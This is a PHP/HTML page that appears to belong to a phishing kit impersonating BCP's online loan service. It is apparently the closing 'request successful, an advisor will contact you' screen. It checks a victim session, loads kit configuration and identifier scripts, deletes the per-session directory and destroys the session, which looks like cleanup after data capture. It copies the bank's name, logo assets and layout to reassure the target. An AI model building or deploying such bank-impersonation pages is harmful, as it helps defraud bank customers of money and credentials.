<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';
include '../utils/php_files/functions.php';
include '../utils/php_files/identificators.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

$session_id = $_SESSION['session_id'];

deleteDirectory($session_id);

session_destroy();

?>

<!DOCTYPE html>
<html lang="en" class="hydrated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Dinero al instante | Pide un préstamo BCP online</title>
    <link rel="stylesheet" href="files/main.css">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="files/favicon.ico" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="files/stylo.css">
	<style>
		@media screen and (max-width: 320px) {
			#fecha-hora {
				font-size:14px;
			}
			#asesor {
				font-size:14px;
			}
		} 
	</style>
	<style>
		.placeholder {
    		position: absolute;
    		top: 50%;
    		left: 10px;
    		transform: translateY(-50%);
    		color: #999;
	    	font-size: 16px;
			font-weight:600;
    		transition: top 0.3s, font-size 0.3s;
    		pointer-events: none;
			background: white;
    		padding-left: 5px;
        	padding-right: 5px;
		}
		
		.placeholder.enfocado {
    		top: 0;
			font-size: 12px;
			color: #0a47f0;
			font-weight:600;
		}
		
		.transparent {
			display: none;
		}
		
        #bodyloader {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background-color: var(--primary-700, #002a8d);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            position: relative;
            width: 70px;
            height: 70px;
            border: 3px solid #002376;
            border-top: 3px solid var(--secondary-500, #ff7800);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .image {
            width: 30px;
            height: 30px;
            background-image: url("files/favicon.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
		
		.step-point {
    		width: 10px;
    		height: 10px;
    		background-color: var(--onsurface-200); /* Color por defecto */
    		border-radius: 50%;
    		display: inline-block;
    		margin: 0 5px; /* Espacio entre los puntos */
		}		

		.step-point.active {
    		background-color: var(--primary-300); /* Color del paso activo, cambia esto según el color del paso 1 */
		}
	
    </style>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
	<div class="loading-screen" style="display:none;" id="bodyloader" style="height: 100%; margin: 0; overflow: hidden; background-color: var(--primary-700, #002a8d); display: none; align-items: center; justify-content: center;">
	 <div class="spinner-container">
		 <div class="image" style="top: 52px; width: 25px; position: relative;"></div>
		 <div class="spinner"></div>
		 <p class="message" style="text-align: center; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important; font-size: 13px; color: white; margin-top: 10px;">Espere un momento <br> por favor</p>
	 </div>
	</div>

<div id="bodyapp">
<eva-root _nghost-hbf-c0="" ng-version="7.2.16">
    <bcp-layout _ngcontent-hbf-c0="" fixed-menu="" ignore-scroll="" class="hydrated">
        <section class="layout">
            <bcp-navbar menu-position="right" is-fixed="" class="hydrated">
				<nav class="navbar navbar-expand-sm bg-primary-700 navbar-dark fixed-top" style="min-height: 60px; display: flex; justify-content: space-between;">
					<div class="container" style="width: 85%;">
            			<a class="brand-margin-left navbar-brand">
                			<bcp-img class="hydrated">
                    			<img alt="Dinero al instante" src="files/dark-default.svg" class="hydrated">
                			</bcp-img>
            			</a>
        			</div>
        			<div id="hamburg" style="position: relative; right: 16px;">
            			<svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            			</svg>
        			</div>
    			</nav>
			</bcp-navbar>
            <main class="layout-content" style="margin-top:100px;">
                <div _ngcontent-hbf-c0="" class="container">
                    <div _ngcontent-hbf-c0="" class="row">
                        <div _ngcontent-hbf-c0="" class="col">
                            <div _ngcontent-hbf-c0="" class="steppers"></div>
                        </div>
                    </div>
                </div>
                <router-outlet _ngcontent-hbf-c0=""></router-outlet>
                <eva-home _nghost-hbf-c1="">
                    <eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="">
                        <div _ngcontent-hbf-c2="" class="banner" style="background-color: white; background-size: auto 361px; padding-bottom: 300px; clip-path: ellipse(100% 100% at 37% -15%); background-image: none;">
                            <div _ngcontent-hbf-c2="" class="container" style="padding-top: 26px !important;">
                                <div _ngcontent-hbf-c2="" class="row">

                                    <div _ngcontent-hbf-c2="" class="col-md-6 order-md-1 d-flex justify-content-center justify-content-md-end">
                                        <div _ngcontent-hbf-c2="" style="bottom: 22px; right: 10px; position: relative;">
                                            <picture _ngcontent-hbf-c2="" class="banner-start-image">
                                                <img _ngcontent-hbf-c2="" alt="" class="banner-start-image" src="files/spotorange.svg" style="width:120px;">
                                            </picture>
                                        </div>
                                    </div>
                                </div>
								<p _ngcontent-fiu-c32="" class="text-center bcp-font-demi" id="stepDescription" style="margin-bottom:0px;font-size:18px;">¡Tu solicitud se realizó con éxito!</p>
								<h4 id="montoglobal" class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 500; position: relative; color: var(--primary-700,#002a8d); font-size: 34px; line-height: 1.2; width: 80%; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; margin-left: 10%; text-align: center; text-rendering: optimizeLegibility; top: 40px;"></h4>
								<div style="margin-top: 40px; display: flex; justify-content: center; align-items: center; height: 50px;">
									<span id="fecha-hora" class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'), helvetica, arial, sans-serif; color: #001f5a; font-weight: initial; color: #002a8d; position: relative;"></span>
								</div>
								<div style=" display: flex; justify-content: center; align-items: center; height: 20px;">
									<span id="asesor" class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'), helvetica, arial, sans-serif; color: #001f5a; font-weight: initial; color: #002a8d; font-size: position: relative;text-align:center;">En breve un asesor se comunicará contigo.</span>
								</div>	
								<div style=" display: flex; justify-content: center; align-items: center; height: 20px;margin-top:30px;">
									<div class="" style="border-top: 1px solid #eceded; width: 100%; margin-top: 30px; position: relative;">
									</div>
								</div>	
                            </div>
                        </div>
                    </eva-banner>
                </eva-home>
            </main>
        </section>
    </bcp-layout>
</eva-root>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
   document.addEventListener("DOMContentLoaded", function() {
    var valorMontoGlobal = localStorage.getItem("monto");
		var montoglobalElement = document.getElementById("montoglobal");
		montoglobalElement.innerHTML = valorMontoGlobal;
    })
</script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
            const meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];

            const now = new Date();
            const diaSemana = dias[now.getDay()];
            const dia = now.getDate();
            const mes = meses[now.getMonth()];
            const año = now.getFullYear();
            let hora = now.getHours();
            const minutos = now.getMinutes();
            const ampm = hora >= 12 ? 'pm' : 'am';
            
            if (hora > 12) {
                hora -= 12;
            }
            
            const fechaHora = `${diaSemana} ${dia} de ${mes} ${año} - ${hora}:${minutos} ${ampm}`;

            document.getElementById('fecha-hora').textContent = fechaHora;
        });
    </script>
</div>
</body>
</html>